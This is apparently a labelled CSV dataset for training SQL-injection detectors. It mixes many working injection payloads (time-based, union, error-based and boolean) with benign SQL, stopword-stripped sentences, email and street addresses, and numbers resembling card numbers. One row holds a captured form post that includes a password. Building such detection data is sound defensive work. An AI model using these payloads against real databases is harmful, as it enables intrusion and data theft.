Query,Label
SELECT eleven ( s FROM nothing RIGHT JOIN,0
1' and 2908 = 8067--,1
3.5822E+015,0
4897,0
sielanski@prestamosypersonales.bj,0
"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) # dbzk",1
"1""  )  )   as bovm where 5560 = 5560 union all select null,null,null,null,null,null,null#",1
alegra,0
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cxor'  =  'cxor",1
SELECT DISTINCT heading FROM grown,0
23763353y,0
roncha,0
SELECT * FROM welcome WHERE lack = 'success' LIMIT 3,0
"-8824%'  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  '%' = '",1
-2483' where 1327 = 1327 union all select 1327#,1
select  ( case when  ( 1726 = 4080 )  then 1726 else 1/ ( select 0 )  end ) --,1
SELECT AVG ( daughter )  FROM increase  SELECT SUM ( shall ),0
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",1
1%'  )  )   and 7989 = 3457,1
"&quot; Year-to-date , 10 countries profitable several track record full-year earnings interest tax contributions , &quot; said",0
0273416778128431,0
4243993376239926,0
"select sleep  (  5  )   and ""irxg""  =  ""irxg",1
depp@rpdkorea.il,0
17621392b,0
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,1
asander1@nutrimama.do,0
escal,0
6131,0
SELECT * FROM wave,0
A representative Lowndes County Sheriff &apos;s Office immediately available comment contacted Thursday,0
norean,0
"&quot; We aspire better tomorrow , new Egypt second republic , &quot; Morsi said solemn ceremony shown live state television",0
"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
"1 )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )",1
47418,0
"-9861' union all select 5710,5710,5710,5710,5710--",1
SELECT your FROM natural,0
"On saying, What I sacredness traditions, I live wholly within? friend suggested, — “But impulses may below, above",0
"1%"" )  and 2006 = 2006",1
"1""  )  )   as tljw where 8474 = 8474 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1
"INSERT INTO wool ( vapor, frog, ranch, nodded, war, angry )  VALUES  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )",0
talmadge@movintel.uz,0
"1' )  as fyuh where 7608 = 7608 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
"urbanitzacio las lomas, 18, 4a",0
SELECT * FROM simple WHERE changing = 'like',0
671271000000000,0
"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
beaumont@lasmilyuna.gi,0
currey99,0
6540000000000000,0
matacandelas,0
"alcatraz, 43, 2-g",0
"(  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )",1
"select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1
balzo@onlinegratis.lv,0
siku@tartasconamor.in,0
SELECT TOP 3 * FROM temperature SELECT * FROM nearest 3SELECT * FROM vessels,0
"c/ belgica, 69 2?d",0
-4900'  )  )   or 7208 = 3236,1
"SELECT DATE_SUB ( ""2017-06-15 09:34:21"", INTERVAL 3 HOUR ) ;",0
9584356702291868,0
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,1
"arco del meson, 47,",0
"-4637"" where 8354 = 8354 or 1186 = 2714--",1
banderizar,0
"1' )  as uvxl where 6211 = 6211 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
08181,0
"select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1",1
"In order achieve HQ 100aKlima protection , around four million € must invested Gechingen , whereby town count State subsidy around 70 per cent",0
"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1
"c/ curadero, 101, 12?e",0
"-8797""  )  )   order by 1#",1
1  )  )   as xzcl where 2332 = 2332,1
"1%""  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""%"" = """,1
"SELECT Employees.frog, COUNT ( Orders.instantID )  AS catFROM    ( OrdersINNER JOIN refused ON Orders.stillID  =  Employees.medicineID )",0
"-8128""  )  )   as ovjz where 7375 = 7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1
select sleep  (  5  )   and   (  'pwpc'  =  'pwpc,1
artillera,0
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",1
boys@muebetuweb.mu,0
"select * from users where id = 1 or 1#""? union select 'a',version (  )  -- 1",1
"1"" )  where 7452 = 7452",1
1'  )   where 5279  =  5279 or sleep  (  5  )  #,1
Here standard private television production presented purest form,0
"c/ san gines, 180, 3-d",0
corrales de duero,0
SELECT pot ( s )  FROM hang SELECT know ( s ),0
"Obvious signs development , budding breasts , pubic underarm hair body odor appearing sooner girls",0
The firm originally business helping states tax drivers,0
"SELECT * FROM low ORDER BY helpful, were",0
19127,0
"-9820"" or 1038  =  7502#",1
"-6279' )  union all select 3026,3026,3026,3026,3026,3026,3026,3026--",1
"1""   )    )    union all select null,null,null,null,null,null,null,null#",1
gavald,0
02247,0
morea,0
SELECT * FROM pictured WHERE shown = 'mix' FETCH FIRST 3 ROWS ONLY,0
"frutos 65, 10?a",0
1%' and 7533 = 7533 and '%' = ',1
SELECT thread ( s )  FROM whom UNION ALL,0
"SELECT column1 , column2, ... FROM table_name WHERE condition1 OR condition2 OR condition3 ... ;",0
00207473j,0
1' )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( 'mizk' = 'mizk,1
"select * from generate_series ( 2317,2317,case when  ( 2317 = 9706 )  then 1 else 0 end )  limit 1--",1
7332706873817194,0
"select sleep ( 5 )  and   (  (   ( ""zlal"" = ""zlal",1
SELECT physical FROM mix UNION ALL SELECT safety FROM frog ORDER BY prepare,0
14962243f,0
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )",1
66753049b,0
"SELECT COUNT ( basis ) , mysterious FROM dirt BY cent",0
08580,0
DELETE FROM port,0
SELECT * FROM congress 3 SELECT * FROM page,0
mario,0
3260901599339838,0
' and 1 in  ( select var from temp ) --,1
"While airport management announced via short messaging service Twitter shooter custody , &quot; Los Angeles Times &quot; reported man dead",0
aitor,0
"""^""",1
UPDATE doing SET die = 'damage'WHERE harbor = 'heat',0
27236120a,0
"-6442""   )    )     )   or 3038  =  3038",1
SELECT * FROM mass WHERE ocean = 'syllable'  AND City = 'characteristic',0
baxevanos@clubdeviaje.fk,0
Participants must prove skill strength carrying bucket water 50 metres,0
"1'+ ( select 'asmj' where 7808 = 7808 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  +'",1
portillo,0
"select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1
car7gordo,0
painter.stovin@tetdevelocidad.bn,0
"SELECT crossID AS ID, nothing AS represent FROM which",0
-1629'  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 'tezf' = 'tezf,1
"eliseo pinedo lopez, 195, 11-d",0
"de]]>  </email_address>   <find_account_answer>  <![CDATA[fqaepqdkct]]>  </find_account_answer>   <find_account_question>  <![CDATA[6]]>  </find_account_question>   <homepage>  <![CDATA[]]>  </homepage>   <is_secret>  <![CDATA[]]>  </is_secret>   <methodCall>   <mid>  <![CDATA[qna]]>  </mid>   <module>  <![CDATA[member]]>  </module>   <nick_name>  <![CDATA[ElwoodBuckley041104]]>  </nick_name>   <params>   <password2>  <![CDATA[Yxg6dsF5iU]]>  </password2>   <password>  <![CDATA[Yxg6dsF5iU]]>  </password>   <reward_point>  <![CDATA[0]]>  </reward_point>   <title>  <![CDATA[Ways To Make Cash Online - Make Money From Home]]>  </title>   <user_id>  <![CDATA[ElwoodBuckley041104]]>  </user_id>   <user_name>  <![CDATA[ElwoodBuckley041104]]>  </user_name>   =  =   =  = 01 @7520 A3B10 A3B12C41 A3B12C411 APP AR-203 ASCd AgAHMzM3MsdfjMwMExG6Pvz1i3DhGd7DSt5Ve9Qu/n91BdfdEB5EbdeO/M5lphLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjaDz2yHm9tJWbLuELC/JM8Eix/VtyWmMO5osa8FbYZnPanAxI7Ty0n7avQytu2rEK2F+N+C390zLVThtSXL1Isk49OSEWuEAzdaRlmLUWcpx6XSDjFZ++1cgwEoAILJ9Q5NObm6nYipbGovJ6YZgiEncnT9GU6x6sgKNppX0YgXXmss+0Qi5eXWmDn30UlwjfTbmc+Ta17XLDXGm6f/hiM7f4fde+5c+Pavn9EIZXYe9K6G/GyCM7I0dzjPIsjEOwl96y+fYXoZoJcp79kLwtTy6F1dL1HAs8DSFoIrfoUs7zyFtzgMnV2K0sT68IwWkiof2eM1Xes5nbDzmHOEQZ+loGLF2UBIyGcz4cSCtdZhrJXt7TxSIzeHKYpCgtVhNo4zJDlHo7zpUnR+8dSlUsdf18e08zs4iGMRK43bhv6oGA6dUw/dX+exrGTL+NMOThQUQvFdYNsc+AFGWo3PqLFhjQ9s3RzK5krr6II3e2vKhs36q7NgNgaIlQNiqNo8cNbE8iVUxZcHhvxaOStpiUN+N9KY4sZ51Ole8offosPb1NqXs3575SXU+1dEpaggUrUJqKjeUM4Hu90KoHmbL2+/zt6Bk+GCnk2WBKJENscEetfLBCBzBGXPlKC7/G5W4k8Gviynn4qCUoD9FvagtKTTF4MaA5rZtrKRabUae++259WRUZ3VEHfzjpXLaogS9DoeVHDebAClkkuAdU6F6fa2wFIM58 =  AgAHMzM3MjMwMJnS2WotX5wisoSRNiccx9VSfDnC/TFaDo/9wddE55SqhLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjDz2yHsm9tJWa4Oyj22HdAIrJSshxe0KmKTxD4lBsReQqG6IN3ULz8oaEwMT7lKcx4Ukfep1IwCe7xHXlsW2gCFxdZmh731jKLuFDn/9rcY4AkdgqajLoHmVnLk3uBcTxbQS8XWJJk8++VnGu9toYSualxl0CgjSRgl01ddYqiaVYQOBShAcHCdfbHmbDZIPrPowSVFUAGpYsVDx3fVEdDa8NKRAPMI3wAlq40FqZDdhNXNr70OL9ZRzS82kWdHP8w2hd1KcIheAxDSw4a5FLAjzSWrdjcOvUfJQO5QT/90J19i2IWnuTNIdTzOcf3uVy23sHyWmsBEWHyaSsKDm7dfOPPwHIWamQKkdcm5KoWp/FgoIR09S0cn/BZzLOsdcFSbhYOxA =  =  B_qna B_solution Bn2GepSdoAsdfe4V4a1@V$K@Bn2GepSdoAe4V4a1@23V$K@PlVEBnTVHAYa01hH@V$K@eTZyMZ0F3YBl4Ozr@V$K@Bn2GepSdoAe4V4a1@V$K@xJ8t+K+x1e6/nqCp@V$a1K@PLnd8fSYoXD3QL3s Board00001 C CYsdfSL7J/aXGaV/30TU412JWfjHA =  =  Cont Content-Disposi Content-Disposition: form- Content-Disposition: form-data; name = ""app"" Content-Disposition: form-data; name = ""cd_loan_type"" Content-Disposition: form-data; name = ""id_finance"" Content-Disposition: form-data; name = ""mode"" Content-Disposition: form-data; name = ""no"" Content-Disposition: form-data; name = ""no_goods"" Content-Disposition: form-data; name = ""path"" Content-Disposition: form-data; name = ""pnm"" Content-Disposition: form-data; name = ""return_page"" Content-Disposition: form-data; name = ""type"" D2 D3 DC-3000 DF Del E EA F1 F4 F5 F6 FG123P8HQ+vasd0pVzD2O+YlD+v1V2g =  =  FmsdfVDvlXqIVetUIzs@V$K@Vj+fqZ6TuN123pq1X2w@V$K@dqRLntgax88tXGB3@V$K@R43SsinxoXFCKjAy FmVDvlXqIVetUIzs@V$K@n5aESvV0q4Se1iBn8@Vasd$K@M5IvfWDvvs5y1TnouS@V$K@Vj+fqZ6TuNpq1X2w@V$K@fuvKbfOrsGKtsDsdf7l@V$K@ZtgfO1WcVPD67KFos@V$K@dqRLntgax88tXGB3 Free Fun Hf6DNiDdq1xzaB3bdDT@V$512K@MRn61gAqhi0iae213dd@V$K@Hf6DNisdfDxzaB3bdDT@V$K@rSTgzjcYIY7Iirl+@V$K@iTI/NtJsfFTdH8ah@V$K@Hf6DNiDxzaB3bdDT@V$K@EdodGNxPNEYWbWcs JVwH/8xSq6ezJPYt@V$s23K@vPr4I41U8oeym0BEi+@V$K@3WPcTx1mJ5sBdACl@V$K@3WPcTx1mJ5sBdACl@V$K@QpmadUUMPKv2tSJP@V$K@JVwH/8xSq6ezasdfJPYt@V$K@vPr4IU8oeym0BEi+ L-840 360ml 트리거 L-840 450 트리거 L5VSRxv4dfoDXwH+hZ@V$K@T0NO9ASwF7J4gKAh@V$K@VWvmclMqqannOAJf@V$K@ERQVjx2OGeE0Mxdf@V$K@VicBva15FL1xm0WH@Va123$K@T0NO9ASwF7J4gKAh@V$K@VicBva15FL1xm0WH PSC-1 NPP Purchase omnicef without prescri QJt5lWbasdftpJ3yciKW@V$K@Hf6DNi123Dxz1aB3bdDT@V$K@iTI/NtJsfFaTdH8vah@V$K@MRn61gAqhi0iaedd QNA_7 R RandD S SF-1013 SR-600 School TC-100 TP1 TracyJat TzwvXJPEcaaOZ9DhJ0@V$K@6DPV+YkQBHbJYSMo@V$Kw@fykXPjdnQQrXTvasdfSr@V$K@c1LOcyiCkFas+XHzbo@V$K@LIHG/+VLgv8RRGR01123@V$K@TzwvXJPEcOZ9DhJ0@V$K@uiGFBm0312rIUaiuBxk UWxvAe743xrPY10JM@V$K@rojWCf7y+OXORcBK@V$Kv@0AIa2oYla5Nt1ckw3@V$K@GMPMso40NCSoArEA V V0hYD71LOy24uhiN4N@3V$K@L5VSRxv4oDXwH+hZ@Vsdf$K@znwrm3vjnUyJBkle@V$K@OuJAnfBzCHbLSge1 VISITVIEW WJyyJ+94QQ2bZbMjn@V$K@kyzIU123+92FxfeBsdfaTn@V$K@3GcBPScFJ6QQEw12gn@V$K@kyzIU+92FsdxfeBaTn@V$K@kNefOsew6E+LZCD51r@V$K@WJyyJ+94Q4asdfkQbZbMjn@V123$K@WJyyJ+94QQbZbMjn WlDxZ/Xl9Gqymv123SWnoZdkHQ =  =  WnuIfx55kZ XQg12SK2QaeLWOadsfsa124yeMxePT1Pg =  =  Y Y&check_name Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y Y29k123ZT1mcmVlJnNlYXJjaasdvFa9pdGVtPSZzZWFyY2hfb3JkZXI9JnVuc2luZ2NvZGUxPTEyNTc3NTU2OTEkljoimdW5zasadfW5nY29kZTI9MTI1Nzc1NTc4123OCZ1asdfbnNpbmdjb232Rl41Mz0mY2F0ZT0mcHdkPQ =  = || Y29kZTasdf1xbmEmc2VcwehcmNoX2l0ZW09JnNlYXJjaF9vcmRlcasdj0mdW5zaW5nY29kZTE9MTIc131Nzc1NTY5MSZ1bnNpbmdjb2RlMj0xMjU3NzU1NzczJnVuc2412sasdfqluZ2NvasdfpwZGUzPSZjYXRlPSZwd2Q9|| YM YYkswPo6JL4ZZMkx@V$K@JnrdZp35dfasbHSPasldfp1123x571@V$K@7QbUi7a/9aCtxupAas;ldf@V$K@7QbUi7a/9aCtxupA@V$Ks;dlfsalkl;k@jW4BJJFvS0sJfNr9@V$K@YYkswPo6JL4ZZMkx@V$asdlkfjK@cM7J0WfRkiELyEje YcrJWg5O Yfrhmym9asdfkHyKybz9y@V$K@7asdlfksaldfXRKgdViFaBwTq7N@V$K@Yfrhmym9HyasldfkpoKybz9y@V$K@ZIKXXH1fCD3qlt7L add again_loan_Mobile agree_10_1 agree_20_1 agree_20_2 agree_30_1 agree_30_2 agree_30_3 agree_30_4 agree_40_1 agree_40_2 and1 ap14 application apply2 checkPwd",0
"-5217'|| ( select 'juen' from dual where 7336 = 7336 union all select 7336,7336,7336--",1
chasse,0
"A man Caesar born, ages Roman Empire",0
4.46658E+015,0
"INSERT INTO solution ( swung, pencil, cup, welcome, those, unhappy )  VALUES  ( 'impossible', 'pen'. title', 'weak', 'front', 'judge', 'sets' )",0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,1
5010630000000000,0
The CDC found prevalence food allergies among children increased 18 percent 1997 2007,0
"-5372"" )  as wlqm where 2432 = 2432 union all select 2432,2432,2432,2432,2432,2432#",1
"SELECT apple,around,brief,traffic,product     (  (  roll JOIN social ON magnet.immediately =  fought.wait )   INNER JOIN citizenON Orders.promised =  brief.gainID )",0
SELECT pain FROM stepped,0
"This year , even absolute top athletes starting line main race",0
SELECT TOP 3 * FROM attached WHERE wrong = 'sign' SELECT * FROM easily,0
SELECT * FROM breathing WHERE dropped NOT LIKE 'bottom%',0
The Hamburg Towers basketball project declining make application possible stand-in place,0
SELECT * FROM acres WHERE began = 'who' FETCH FIRST 3 ROWS ONLY,0
select  ( case when  ( 3435 = 4011 )  then 1 else 3435* ( select 3435 from master..sysdatabases )  end ) --,1
elsie,0
"-5425 where 5933 = 5933 union all select 5933,5933,5933--",1
"The EU &apos;t disappear , revert something like loose &quot; Europe (Sovereign) Nations &quot; favoured General de Gaulle",0
58c058ars4,0
"fix seatbacks General Motors Co recalling nearly 19,000 all-new 2014 Chevrolet Silverado GMC Sierra pickup trucks repair problem manual reclining seatback , according notice U",0
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and ""dsae"" = ""dsae",1
afoscarse,0
24331853s,0
"-9440"" union all select 5599,5599,5599,5599,5599--",1
tennant4,0
"The question mark end input determined direct object modifier (dobj) identified, together long range clue auxiliary word occurs nominal subject (nsubj)",0
or  ( EXISTS ),1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1
"1%'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
ofere*nte,0
"1%""   )    )     )   union all select null,null,null,null,null#",1
9131603493426395,0
"1"" )  as pkkx where 6716 = 6716 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1
"-7543'  )  )   )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
"select * from users where id = 1 or ""@%"" or 1 = 1 -- 1",1
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'vjhw' like 'vjhw",1
12480,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'ichh' like 'ichh",1
SELECT * FROM neighborhood WHERE zero = 'earlier',0
"1%""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1
"SELECT respectID AS ID, experiment AS happily FROM can",0
1  )  )   as uvep where 6016 = 6016 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,1
"SELECT COUNT ( report ) , throat FROM task BY speech",0
The Electoral Commission studying options electronic voting recently released joint discussion paper New Zealand,0
1 where 2956  =  2956,1
ficker,0
"-2782"" union all select 2109,2109,2109#",1
"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1
nada,0
3242090000000000,0
SELECT AVG ( Price ) FROM produce,0
"select * from users where id = 1 or ""%1"" or 1 = 1 -- 1",1
SELECT * FROM shine FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM agree,0
"&quot; This tax going black hole , &quot; said Adrian Moore , vice president policy Reason",0
bui,0
SELECT AVG ( flower ) FROM five SELECT SUM ( direction ),0
SELECT * FROM motor  WHERE rhyme = original,0
"Nevada among several states scrambling find affordable technology would allow state keep track many miles car driven , exactly time",0
"1""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""rkfk"" like ""rkfk",1
Previous tobacco vaccines failed contained antibodies,0
"1""  )   union all select null,null,null,null,null,null,null#",1
1'||  (  select 'uiyj' from dual where 8320  =  8320,1
"There &apos;s increased social acceptance pawnbroking means secure short term , secured financing",0
SELECT eaten ( s )  FROM captured,0
e41t8r,0
SELECT * FROM rubber FETCH FIRST 3 ROWS ONLY,0
Nor types people use pawnbrokers financially stretched,0
1'|| ( select 'noik' from dual where 9851 = 9851,1
"el caaveral 130, 5-f",0
rgiva,0
mercador,0
bolvir,0
"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",1
"SELECT road, favorite, badFROM victory WHERE cause  IS NOT NULL",0
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  +'",1
1 )  or sleep ( 5 ) #,1
85089975a,0
"Our acts angels are, good ill, Our fatal shadows walk us still",0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and 'lckw' = 'lckw",1
bisunta,0
1'||  (  select 'npel' from dual where 5258  =  5258,1
SELECT TOP 50 PERCENT * FROM needle SELECT * FROM week FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM guide,0
"1  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  9914 = 9914",1
"INSERT INTO vote ( frame, more, from, date, simple, children )  VALUES  ( 'stand', 'love'. upon', 'mill', 'if', 'system', 'deep' )",0
"1'  )   where 4407  =  4407 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"SELECT giant,having FROM suit WHERE medicine = 'read' UNION SELECT explanation, biggest FROM time",0
However said heartened worldwide response &quot; act political expression,0
22513,0
SELECT TOP 50 PERCENT * FROM popular,0
sabathiel,0
"Highland Games Kaltenhof Alongside brake van pulling tractors , also second contest agricultural autumn festival Kaltenhof 6 8 September",0
acehche,0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0
1'||  (  select 'vwls' where 5252  =  5252 rlike sleep  (  5  )  #,1
"1'||  (  select 'ylek' where 3803  =  3803 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1
"However , so-called &quot; throwaway society &quot; think things",0
himsel_ewande@spainbareback.ad,0
egle,0
"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )",1
"A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0
SELECT Count ( * )  AS foreign,0
"-5196""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""gbcq"" like ""gbcq",1
idalio,0
"select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1
"c/ fuente del peral 41,",0
1  )  )   or pg_sleep ( __TIME__ ) --,1
SELECT * FROM consonant WHERE regular LIKE '%now%',0
patenaud,0
"c/ padilla, 74 12h",0
h958013a,0
"1  )   union all select null,null,null,null,null,null,null--",1
"( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and  ( ""%"" = """,1
SELECT * FROM reason WHERE again = 'string',0
"1' where 8869 = 8869 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
1'+  (  select 'ezpy' where 5282  =  5282 order by 1#,1
SELECT * FROM helpful 3 SELECT * FROM store,0
macoosh3,0
SELECT * FROM also WHERE test LIKE '%farm%',0
ohn,0
SELECT * FROM cream,0
bugarra,0
"select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1
10110,0
"-5509%""  )  )   )  union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",1
"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1""   )    )     )   order by 1#",1
"1""  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  ""nepk"" = ""nepk",1
